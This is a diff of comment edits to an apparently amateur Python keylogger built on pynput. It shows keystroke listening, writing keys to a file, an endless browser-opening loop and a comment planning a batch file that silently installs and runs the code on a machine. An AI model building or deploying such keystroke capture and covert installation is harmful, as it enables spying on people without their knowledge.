@@ -30,7 +30,7 @@ def on_press(key):
 
 
     #browser repeat open
-    if i>=10000000000:
+    if i>=10000000000:              #change the number here for it to activate after <your number> of alphabets.
         while True:
             webbrowser.open("https://www.youtube.com/")
         i=0
@@ -53,7 +53,7 @@ def write_file(keys):
             
 
 
-#for stopping everything.a
+#for stopping everything
 def on_release(key):
     if key == Key.esc:
         return False
@@ -63,7 +63,7 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release)as listener:
     listener.join()
 
-#upload to git.make a batch file that installs git and pulls the code and runs it(run u need to figure out.)
+#make a batch file that installs git(how tf....?) and pulls the code and runs it(run u need to figure out.)
 
 #ethical:add a pw for this so that it can work as a parental control thing.
 
